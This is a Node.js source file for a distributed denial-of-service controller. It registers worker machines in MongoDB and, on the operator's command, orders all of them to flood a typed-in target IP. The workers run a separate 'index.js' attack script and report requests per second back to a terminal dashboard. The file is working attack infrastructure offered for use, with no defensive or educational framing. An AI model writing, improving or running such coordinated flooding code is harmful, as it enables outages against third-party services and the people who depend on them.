//node driver listen <port> <externalPort> 
//node driver host <port> <externalPort>


const { spawn } = require('child_process')
let i = 0
const env = require('dotenv').config()

const events = require('events');
let db = new events.EventEmitter();

//logs
const blessed = require('blessed');
var screen = blessed.screen(),
    body = blessed.box({
    top: 0,
    left: 0,
    width: '100%',
    height: '100%',
    tags: true
    });

screen.append(body);

screen.key(['escape', 'q', 'C-c'], function(ch, key) {
return process.exit(0);
});

function status(text) {
    body.setLine(0, '{blue-bg}' + text + '{/blue-bg}');
    screen.render();
}
function log(text) {
    body.insertLine(1, text);
    screen.render();
}

//db
const mongoose = require('mongoose');
const { readlink } = require('fs');
mongoose.connect(process.env.mongo_uri, {
	useNewUrlParser: true,
	useUnifiedTopology: true,
}).then(() => {
    console.log('Connected to the database')
    db.emit('connected')
})

instancesInfo = new mongoose.Schema({
    host: Boolean,
    ip: String,
    port: String,
    password: String,
})

let Instance = mongoose.model('instance', instancesInfo)

let name = Math.random().toString(36).substring(2, 4).toUpperCase()
    function driver(ip, hostIp, port, password, useUDP) {

        function startSpawn(){
            let ddos = spawn('node', ['index.js', ip])

            //send http request to server with ip and average
    
            const http = require('http');
            let j = 0;
            let outData;
            setInterval(() => {
                if(j > 0 && outData != undefined) {
                    const options = {
                        hostname: hostIp,
                        port: port,
                        path: `/${password}/${name}/${outData}/${j}`,
                    }
                    http.get(options)
    
                    
                }
                j = 0
            }, 1000)
            let logs;
            ddos.stdout.on('data', (data) => {
                j++
                data = data.toString().replace(/(\r\n|\n|\r)/gm, "")

                let iteration = `(#${i})`

                logs = `${iteration}${data}`
                    
                outData = logs;
                    outData = outData.replace(/ /g, '%20');
                    outData = outData.replace(/'/g, '%27');
                    outData = outData.replace(/:/g, '%3A');
                    outData = outData.replace(/#/g, '%23');
                    outData = outData.replace(/\(/g, '%28');
                    outData = outData.replace(/\)/g, '%29');
                let num = data.toString().split(' ')[1]
                num = parseInt(num)
                if(num > 500) {
                    ddos.kill()
                    i++
                    startSpawn()
                }
            }) 
            setInterval(() => {
                console.log(logs)
            }, 1000)

   
        }
        startSpawn()
    }

    function listen() {
        const express = require('express')
        const app = express()
        const crypto = require('crypto')
        const password = crypto.randomBytes(128).toString('hex')

        app.get('/', (req, res) => {
            res.status(200).send('Instance is running')
        })

        app.get('/:passwd/:ip/:method', (req, res) => {
                if(req.params.passwd != password){
                    res.status(401).send('Unauthorized')
                }
                else {
                    let ip = req.params.ip
                    let method = req.params.method
                    res.status(200).send('DOSing ' + ip)
                    console.log('Received request to DOS ' + ip)
                    setInterval(() => {
                        Instance.findOne({host: true}, (err, instance) => {
                            if(err) {
                                console.log(err)
                            }
                            driver(ip, instance.ip, instance.port, instance.password, method)
                        })
                    }, 2000)
                }
            })

        var http = require('http');
        let port = process.argv[3]
        let externalPort = process.argv[4]

        //wait for this to finish
            http.get({'host': 'api.ipify.org', 'port': 80, 'path': '/'}, function(resp) {
                resp.on('data', function(ip) {
                    let Instanceip = ip.toString()
                
                    app.listen(port, () => {
                            console.log(`Listening for requests on ${ip}:${externalPort}`)

                        //check if instance already exists
                        Instance.findOne({instance: Instanceip}, (err, instance) => {
                            if(err) {
                                console.log(err)
                            }
                            else if(instance != null) { 
                                instance.host = false
                                instance.ip = Instanceip
                                instance.port = externalPort
                                instance.password = password
                                instance.save()
                                console.log('Instance info updated')
                            }
                            else {
                                let newInstance = new Instance({
                                    host: false,
                                    ip: Instanceip,
                                    port: externalPort,
                                    password: password
                                })
                                newInstance.save()
                                console.log('Instance info saved to database')

                            }
                        })
                    });
            });
        });
    }

    function host() {
        //rl
        const readline = require('readline').createInterface({
            input: process.stdin,
            output: process.stdout,
            terminal: false
        })
        //ask for target
        readline.question('[INPUTS ARE HIDDEN DUE TO A DOUBLE CHARACTER BUG]\n\nTarget IP and PORT(optional):\n> ', (target) => {
            console.log(target)
            readline.question(`\nSend requests to all instances to start process on ${target}? YES/NO\n>`, (confirm) => {
                if(confirm.toUpperCase() == 'YES' || confirm.toUpperCase() == 'Y') {
                    main(target)
                }
                else {
                    process.exit(0)
                }
            })
        })

        function main(target) {
            const http = require('http');
            http.get({'host': 'api.ipify.org', 'port': 80, 'path': '/'}, function(resp) {
                resp.on('data', function(ip) {
                    let hostIp = ip.toString()
                    let hostPassword = require('crypto').randomBytes(128).toString('hex')
                    let HostExternalPort = process.argv[4]
                    let port = process.argv[3]
    
                    //check if host already exists
                    Instance.findOne({host: true}, (err, instance) => {
                        if(err) {
                            console.log(err)
                        }
                        else if(instance != null) {
                            instance.host = true
                            instance.ip = hostIp
                            instance.port = HostExternalPort
                            instance.password = hostPassword
                            instance.save()
                            console.log('Host info updated')
                        }
                        else {
                            let newHost = new Instance({
                                host: true,
                                ip: hostIp,
                                port: HostExternalPort,
                                password: hostPassword
                            })
                            newHost.save()
                            console.log('Host info saved to database')
                        }
                    });
        
    
                    let unCheckedInstances = [];
                    let onlineInstances = [];
    
                    const http = require('http');
    
                    //get all instances from db
                    console.log('Getting instances from database')
                    Instance.find({ host: false }, (err, instances) => {
                        console.log('Instances fetched')
                        if(err) {
                            console.log(err)
                        }
                        else {
                            instances.forEach((instance) => {
                                let ip = instance.ip
                                let port = instance.port
                                let password = instance.password
                                unCheckedInstances.push(`${ip}:${port}:${password}`)
                            })
                            checkInstances()
                        }
                        
                    });
    
                    function checkInstances() {
                        unCheckedInstances.forEach((instance) => {
                            let ip = instance.split(':')[0];
                            let port = instance.split(':')[1];
                            
                            console.log(port)
                                console.log(`Checking if ${ip}:${port} is online...`)
                            const options = {
                                hostname: ip,
                                port: port,
                                path: `/`,
                            }
                            http.get(options, (res) => {
                                if(res.statusCode == 200) {
                                    console.log(`${ip}:${port} is online and added to the pool`);
                                    onlineInstances.push(instance);
                                } else{
                                    console.log(`${ip}:${port} is offline`);
                                    //remove from db
                                    Instance.findOneAndDelete({ip: ip}, (err) => {
                                        if(err) {
                                            console.log(err)
                                        }
                                        else {
                                            console.log(`${ip} removed from database`)
                                        }
                                    })
                                }
                            })
                        });
                        console.log(`Online instances: ${onlineInstances}`);
        
                        setTimeout(reciveLogs, 2000);
                                
                            function reciveLogs() {
                                const express = require('express');
                                const app = express();
                                const http = require('http');
        
                                onlineInstances.forEach((instance) => {
                                    let ip = instance.split(':')[0];
                                    let port = instance.split(':')[1];
                                    let password = instance.split(':')[2];
                                        
                                    console.log(port)
                                    const options = {
                                        hostname: ip,
                                        port: port,
                                        path: `/${password}/${target}/${mUseUDP}`,
                                    }
                                    http.get(options, (res) => {
                                        if(res.statusCode == 200) {
                                            console.log(`Sent request to ${ip}:${port} to attack ${target}`)
                                        }
                                        else{
                                            console.log(`Failed to send request to ${ip}:${port}; Status code: ${res.statusCode}`)
                                        }
                                    })
                            })
                                
                            let rps = []
        
                            app.get('/:passwd/:name/:out/:rps', (req, res) => {
                                if(req.params.passwd != hostPassword){
                                    res.status(401).send('Unauthorized')
                                }
                                else {
                                    let out = `${req.params.name}: ${req.params.out}`
                                    let name = req.params.name
                                    res.status(200).send('Data received')                                    
    
                                    log(`${out}`)
                                    rps.push(parseInt(req.params.rps))
    
    
                                }
                            })
                            let sentReqs = 0
                            setInterval(() => {
                                //add all rps together
                                let totalRps = 0
                                rps.forEach((rps) => {
                                    totalRps += rps
                                })
                                sentReqs += totalRps
                                status(`Total RPS: ${totalRps}/s - Total sent requests ${sentReqs} - Online Instances: ${onlineInstances.length}\nTarget: ${target}`)
                                rps = []
                            }, 1000)
                            app.listen(port, () => {
                                console.log(`Listening for logs on port ${port}`)
                            })
                        
                    }
    
                    }
            });
        });
        }

        var stdin = process.stdin;
        stdin.setRawMode( true );
        stdin.resume();
        stdin.setEncoding( 'utf8' );
        stdin.on( 'data', function(key){
            if(key === '\u0003') {
                    if(process.platform == 'win32'){
                        const cp = require('child_process');
                        console.log('Windows machine detected, killing all node processes to prevent memory leaks')
                        cp.exec('taskkill /F /IM node*');
                    }else{
                        const cp = require('child_process');
                        console.log('Linux/Unix machine detected, killing all node processes to prevent memory leaks');
                        cp.exec('pkill node');
                    }
            }
        });
    }
    


    if(!process.argv[2]) {
        console.log('Missing arguments')
        process.exit(0)
    }
    if(process.argv[2] == 'listen') {
        if(process.argv.length < 4) {
            console.log(`Usage: node driver listen <port> <externalPort>`)
            process.exit(1)
        }
        db.on('connected', () => {
            if(process.platform != 'win32'){
                const cp = require('child_process');
                cp.exec('ping -V', (err, stdout) => {
                    if(err || stdout.toString().toLowerCase().includes('not found')) {
                        console.log('PING command is not installed, please install it to use this tool')
                        process.exit(1)
                    }
                    else {
                        listen()
                    }
                })
            } else listen()
            
        })

    } else if(process.argv[2] == 'host') {
        if(process.argv.length < 4) {
            console.log(`Usage: node driver host <port> <externalPort>`)
            process.exit(1)
        }
        db.on('connected', () => {
            host()
        })
    }

    process.on('uncaughtException', function (err) {
        console.log(err);
    });

    //on process close
